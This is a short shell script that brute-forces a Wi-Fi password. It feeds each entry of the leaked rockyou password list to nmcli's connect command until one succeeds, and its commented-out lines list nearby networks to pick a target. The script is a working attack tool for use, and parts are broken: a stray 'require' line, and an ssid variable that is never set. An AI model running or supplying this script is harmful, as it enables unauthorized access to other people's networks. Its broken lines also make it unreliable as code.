#!/bin/sh

# wifi=`nmcli dev wifi list | wofi -d | tr -d '*'`
# wifi=`nmcli dev wifi list | tr -d '*'`
# echo $wifi
# ssid=`echo $wifi | awk '{print $1}'`
# # name=`echo $wifi | awk '{print $2}'`
# echo Bruteforcing $wifi
# exit 0
require

# read ssid
ROCKYOU_PATH=~/Downloads/rockyou.txt
count=0
total=`wc $ROCKYOU_PATH | awk '{print $1}'`

while read password
do
    count=$(($count+1))
    echo $count/$total: $password
    nmcli dev wifi connect $ssid password $password && exit
done < $ROCKYOU_PATH
